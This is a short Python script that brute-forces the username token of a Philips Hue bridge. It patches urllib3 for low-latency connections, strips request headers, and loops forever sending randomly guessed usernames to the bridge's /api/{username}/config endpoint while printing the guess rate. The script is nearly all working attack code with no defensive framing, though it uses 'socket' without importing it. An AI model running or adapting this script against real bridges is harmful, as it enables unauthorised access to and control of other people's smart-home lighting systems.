from pprint import pprint
import string
import random
import time

from requests.packages.urllib3 import connectionpool

_HTTPConnection = connectionpool.HTTPConnection
_HTTPSConnection = connectionpool.HTTPSConnection

class HTTPConnection(_HTTPConnection):
    def connect(self):
        _HTTPConnection.connect(self)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

class HTTPSConnection(_HTTPSConnection):
    def connect(self):
        _HTTPSConnection.connect(self)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

connectionpool.HTTPConnection = HTTPConnection
connectionpool.HTTPSConnection = HTTPSConnection

import requests
import discover

s = requests.Session()
s.headers = {}  # make our packet smaller. The server ignores headers
hue_url = discover.find_hue()
real_username = '3121132413'

count = 0
start_time = time.time()
interval = start_time
while True:
    username = real_username[:-5] + ''.join(
        [random.choice('1234') for x in range(5)])
    res = s.get(hue_url + 'api/{}/config'.format(username))
    #pprint(res.json())
    count += 1
    if count % 100 == 0:
        now = time.time()
        elapsed = now - start_time
        print count, elapsed, 100 / (now - interval)
        interval = now
#    time.sleep(0.03)
